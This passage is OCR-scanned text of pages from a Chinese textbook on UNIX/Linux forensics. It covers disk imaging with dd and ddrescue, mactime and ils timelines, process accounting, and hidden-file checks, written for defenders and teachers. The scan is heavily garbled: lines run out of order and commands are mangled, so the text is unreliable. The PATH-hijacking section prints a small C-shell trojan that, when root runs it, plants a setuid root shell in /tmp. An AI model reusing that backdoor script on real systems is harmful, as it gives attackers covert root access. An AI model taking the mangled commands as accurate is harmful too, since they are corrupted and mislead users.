4296703
391167
End
Model
(takestwiceas long)
Calculate SHA-256
1953075283Linux
1951745
194560
Blocks
ohom
第2章UNIX/Linux系统取证
size
Id System
83Linux
CBA
区
2bb.inadu
类文
Mbbhaudi
nodihc
一般来讲，磁
1rwom
清面
休两
S
隆
67
---
## Page 91
容如下：
中的每一个文件都有一个磁盘 inode，它包含文件系统处理文件所需要的全部信息，具体内
的时间是易变的，必须在某个运行进程不经意改变之前收集它们。
为一个挂载点，然后使用回环设备以只读方式安装它：
放到一个更大的文件系统中，把磁盘映像文件当作一个文件系统来加载。先创建一个目录作
以通过两种方法：一种是把映像复制到一个与该映像相同大小的分区里。另一种就是把将它
和搜索这些数据。此时，需要对映像数据进行恢复，并且加载到分析用的系统上，使得分析
物理层上进行更复杂的搜索和对具体的搜索内容进行定位，我们需要在文件逻辑结构层浏览
68UNIX/Linux网络日志分析与流量监控
成一个真实的文件系统进行访问，下面就要将刚才得到的映像复制到另外一台计算机上。可
系统可以访问映像数据的文件系统和硬盘结构。
－从系统的角度来看，文件的索引节点（inode）是文件的唯一标识，也就是说文件系统
另外，Linux 系统可以将映像文件和虚拟设备关联起来，无需恢复，就可把映像文件当
mactime 报告可以将系统时间和文件系统的访问时间关联起来。如果知道入侵时间，便
●各种时间戳，包括文件状态的改变时间、文件的最后访问时间和最后修改时间
●文件类型
分析嫌疑文件系统的一份只读副本，就能收集 mac 时间。在一个使用的系统中，inode
安装完成后，就可以像使用任何其他文件系统一样访问映像文件。
经过上面步骤，二进制映像数据的内容是无法直接阅读的，“hdb5.image”文件也无法在
下面看一个用mactime收集活动时间的例子。
对/dev/hdb5进行备份，生成镜像文件：
?
文件所属组的 GID（Group ID，组标识符）
文件所属用户的UID（UserID，用户标识符）
）与文件相关的硬连接的个数
在文件系统中标识文件的索引号
设备标识符
以字节为单位的文件的长度
#ddif=/dev/hdb5of=/path/hdb5.image
Partition3has differentphysical/logical endings:
#mount-oloophdb5.image/mnt/host
#mkdir/mnt/host
mount-0loop,offset=$（(512*2048))
ubuntu.dd5
Partition4has different physicallogical endings:
Partition4has different physical/logical beginnings (non-Linux?):
ubuntu.dd4*
Partition3doesnotendon cylinderboundary.
phys=(1023,0,1)logical=(2699,0,1)
phys=（1023,235,33)logical=(2698,235,33)
401625
4289354
disk.dd.img
1943865
7630875
/mnt
7
7HPFS/NTFS
HPFS/NTFS
---
## Page 92
上面所有数据复制出来。然而此时不能访问文件，因为文件系统已经损坏。在这种情况下，
在哪儿呢？其实这两款软件从功能上看难分伯仲。接下来，用一个例子来解释。试想一下这
似，ddrescue 可以把数据从一个块设备，完全镜像到另一个地方。那么 dd 和 ddrescue 区别
2.2.7用ddrescue恢复数据
到。大家在看了以上应用以后。
能类似的工具还有icat，用于取得特定的索引节点对应的文件的内容。
序出现的文件访问，就可以还原非法活动的过程。习避题
被访问过，那么在访问时间报告上可以找到这些文件。遇到可疑的事情时，寻找按照时间顺
可以查阅mactime报告，看看哪些系统文件被访问过。如果不知道时间，但是知道哪些文件
Deft 8.2取证光盘中提供了用于硬盘数据恢复的工具ddrescue。同上面讲到的dd工具类
对于图 2-8所示的一些参数，如 gid、mtime、atime 和 ctime 等参数，会在6.5 节中谈
下面介绍的 isl工具，用来显示被删除的索引节点的原始资料，如图 2-8所示，同它功
mactime手册参见http://www.sleuthkit.org/sleuthkit/man/mactime.html。
4294967295 bytes (4.3GB)copied,813.468 s,6.3MB/s
#d if/dev/sdaof=/tmp/bak/disk1.img
#mount/dev/sdb1/tmp/bak
st inolst alloclst uid|s_gist_mtimelst atime|st ctimelst _dtimelst _modelst nlinklst_sizelst_blockOlst block1
8388607+1recordsout
8388608+0recordsin
#mkdir/tmp/bak
#cat ilsdump.txt
#ils hdb5.image >ilsdump.txt
2038|1031|100|984707105|984707105|984707105|984707169|40755|0|0|8481|0
23|0|0|984706608|984707090|984707105|984707105|100644|0|520333|307|308
class/host/device|start_time
图2-8isl显示索引节点
atinelst
root:~
755
55
55
ctime
000.020.801.20
第2章UNIX/Linux系统取证69
052
---
## Page 93
细的所有被调用的进程记录，它追踪时间、二进制文件名和调用该进程的用户。在Linux
解系统攻击的更多信息。进程统计提供了一份有用的系统活动记录。统计程序维护了一份详
/etc/syslog.conf，看看日志信息被送到什么地方了。然后对日志主机实施仔细调查。
激活状态，而且记录足够详细的时候，它才是有价值的。在检查系统时，先查阅一下
2.2.8查看详细信息
程服务器IP地址为192.168.150.200）：
能。首先假设我们通过 ssh 复制磁盘镜像到远程备份数据服务器上，运行下面命令（假设远
命令：
要把数据从/dev/sdal完全镜像到/dev/sdb1 上，镜像文件名命名为backup.img，运行下面
ddrescue不存在这个问题。下面看看如何使用ddrescue。
if=/dev/sda of=/dev/sdb），遇到损坏分区将会失败，因为 dd 遇到错误后会终止操作。而
修复损坏的分区，然后访问上面的数据。但在UNIX/Linux系统上使用dd命令时（例如 dd
可以镜像整个分区到一个文件，这样将不再丢失任何数据。或创建一个loop设备，使用fsck
70UNIX/Linux网络日志分析与流量监控
当 accton 激活之后，就能用 lastcomm命令监测系统进程。
(1）创建pacct 文件
应用实例如下。
要检查一个 Web 服务器，可通过收集 httpd日志实现，采用 grep 来检查日志，有助于了
（2）收集Web等日志与进程统计
系统日志可能是最有价值的，最能反映系统活动的信息源。但只有在系统日志记录处于
（1）查看系统日志
更多 ddrescue 的用法，可以参考 ddrescue 的帮助文档。
有时需要把备份好的数据再集中放一份，这时你不想插拔硬盘的话就可利用网络传输功
假设有一块损坏的硬盘/dev/sdal和一块备用的硬盘/dev/sdb1（分区格式化完成），现在
（2）用accton激活
#accton/var/log/pacct
#tar zcvf-/dev/sda1/PI:EMAIL'cat>/tmp/backup.tar.gz
#ddrescue/dev/sda1-|PI:EMAIL'cat/tmp/backup.img
语法： dd rescue [options] infile outfile
#touch/var/log/pacct
#fsck-y/dev/sdb1/backup.img
检查备份数据的连续性
#dd_rescue/dev/sda1/dev/sdb1/backup.img
.8
---
## Page 94
录最好用/bin/ls来列目录，不要图方便而输入ls。
地发生。接下来说说解决方法。
可写，并将shell 复制到/tmp 并保存为.sh，同时设置其 setuserid 位，所有这一切都非常安静
执行了 Is，所以 root 不会看出有任何异常。如果 root 执行了该脚本，就会将口令文件设置为
用户在/tmp中执行 ls 时，执行的是上面给出的脚本，而不是实际的 ls命令。因为最终还是
管理员身份列出目录，并错误输入成了“1ls”，结果正好“中招”。
击，用户毫无察觉，攻击者悄悄地在他的主目录下放了名为 lls 的脚本。root 用户如果想用
令加到了.bash_profile 里，使所有用户都能“分享”“福音”。但直到有一天，系统受到攻
入./foo.sh的烦恼（foo.sh是假设的脚本文件名）。有的root用户甚至把PATH=SPATH:这条命
令操作如下：
把点加到了搜索路径中，这就相当于在系统中埋下了一枚“定时炸弹”。
来指定用户的当前目录。这对在本机进行脚本开发的程序员来说很不方便，想图省事的人就
包含的目录列表中搜索命令所在位置，对于普通用户和root用户，SPATH里默认不包含"
目录。这些“.”的排列有时候有细微的差别，都可能说明在其中有隐藏的目录和文件。
2.2.9收集隐藏目录和文件
的文件。
/usr/bin中收集事件发生前后被修改的文件，再通过 find 命令查看所有在最后两天之内改变
首先，要养成输入绝对路径的良好习惯，这样就不会让攻击者趁虚而入了。比如，列目
其次，根用户（root）不要把“.”包括到搜索目录列表里，而普通用户如果把“”包括
再看个复杂点的Cshell的例子（sample.sh）：
这下方便了，直接输入脚本名就能执行。正常情况下一点问题没有，也省去了输
例如：root用户为了方便使用，在他的当前路径末尾加了个点""（代表当前目录），命
当用户执行一条命令时，shell（用户和Linux内核之间的接口程序）会在路径环境变量
如果root在其环境变量SPATH包含了“.”并且其位置先于ls所在的系统目录，那么当
一些攻击者会将脚本文件（木马）放在隐藏目录中，因此，应特别注意所有以.开始的
在文件系统中，还可以收集被改动的二进制文件。
（3）收集文件和文件系统的内容斌
exec/bin/ls Sargv|grep-v ls
finish:
chmod 7777 /tmp/.sh
cp/bin/sh/tmp/.sh
gotofinish
If(!-o/bin/su)
#!/bin/csh
/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin:.
[root@rhroot]#echo$PATH
[root@rh root]# PATH=SPATH:.
一种快速的方法是在/bin、/sbin 和
第2章UNIX/Linux系统取证71
---
## Page 95
文件名特征来进行间接搜索。例如，可以利用对指定的文件名后缀（.bmp、.avi、.mp3）进
不具有文本易识别的特征，普通搜索工具无法对其内容进行直接搜索，但调查人员可以通过
应的处理（解压缩、解密、恢复文件等）。
关内容。为保证搜索结果的有效性和准确性，我们应该在开始内容搜索前对这些文件进行相
件，对于那些被压缩、被加密或被删除的特殊文件，无法单独通过这些简单搜索技术找到相
2.3.1特殊文件处理
用，也可以配合使用，从而更好地实现调查数据的范围缩小和可用证据数据的定位。
类的文件搜索命令，以及一些提供了丰富搜索功能的外部综合性取证分析工具，例如
过程中，使用可信任的命令是至关重要的。对于UNIX/Linux系统的计算机取证，应尽量把
记住：在证据收集的过程中，要先收集易消失、容易改变、容易被覆盖的证据。同时在取证
中，还可能要收集许多其他的证据，如电子邮件、加密文件等，但不论是什么证据，都应该
挖掘出/tmp下隐藏后门和/dev下藏匿蠕虫的安全事件。
个目录隐藏木马。因此要仔细检查任何位于/dev下的文件。本书案例六和案例十一讲解分别
系统有几千个设备专用文件，因此这个目录很复杂，有一些黑客就利用这种复杂性，使用这
方，对于取证来说非常重要。在UNIX/Linux中，把所有设备都放进/dev目录，本地安装的
2.2.10检查可执行文件
crontab调用定期执行：
面所述的那种危害。
到搜索列表中，则“.”应当放在搜索目录列表的最后位置上。这样一来普通用户不会受到前
72UNIX/Linux网络日志分析与流量监控
对于比较特殊的情况，例如特定图像和视频、音频的处理，由于此类二进制形式的信息
2.3
一些重要命令（ps、ls、netstat 等）工具刻录到光盘上，以备不急之需。
上面所探讨的在Linux系统中进行证据收集，方法是比较常见的，实际上在取证过程
UNIX环境下的搜索工具主要包括UNIX系统自带的grep之类的内容搜索命令和find之
临时目录/tmp相当于整个系统的缓冲区。
这条命令先搜索所有以点开头的文件，然后将其发送到root的邮箱里，最后进行比较。
root@localhost<point.txt
这个简单的 sed命令将删除路径里所有的“.”，包括其另一形式“：：”。当然，还可以由
最后，可以在登录时在/etc/profile和bashrc.profile文件的末尾添加如下一行：
常用搜索工具
PATH=echo SPATH | sed -e's/：://g; s///g; s/.S/; s/^:/ 
。这里存放着各种信息，是攻击者经常光顾的地
---
## Page 96
资料）、icat（用于取得特定的索引节点对应的文件的内容）等。而这几个工具的使用方法在
时间的工具mactime。另外，还包括一些小工具，如 ils（用来显示被删除的索引节点的原始
过程，要花上几个小时的时间。TCT还包括数据恢复和浏览工具unrm&lazarus、获取MAC
在运行的进程、网络连接，以及硬盘驱动器方面的信息。用它收集所有的数据是个很缓慢的
运行的主机活动进行分析，并捕获主机当前状态。其中的 grove-robber 工具可以收集大量正
2.3.2The Coroner's Toolkit（TCT工具箱）
效率。
员还可以使用参数“--exec”对查找到的符合条件的文件执行指定命令的功能，来提高搜索
从指定的起始目录开始，可以递归地搜索其下的各个子目录。在具体的取证过程中，调查人
包括文件名的字符串、文件内部的字符串、文件修改或访问时间、文件所有者等。find命令
当多的查找条件，可以在文件系统上根据文件的不同特征属性来搜索某一类文件，这些特征
命令用于在指定的目录结构中搜索文件名，并执行指定的操作。此命令功能强大，提供了相
（包括表达式组和可选项），fgrep命令可检索固定字符串，是快速搜索命令。
差别。grep 命令一次只能检索一个指定的模式，而egrep 命令可检索扩展的“正则表达式
个原始设备。
键字搜索，也支持对二进制文件进行关键字搜索。grep 还支持递归地搜索文件系统或搜索整
围，这里不做详细介绍。
TrueCrypt加密过的文件或者分区，面对这种问题有特殊的取证和还原方法，超出了本书范
件，以
理。还需要指出，一些压缩文件中可能还包含压缩文件，这需要调查人员递归地处理每个文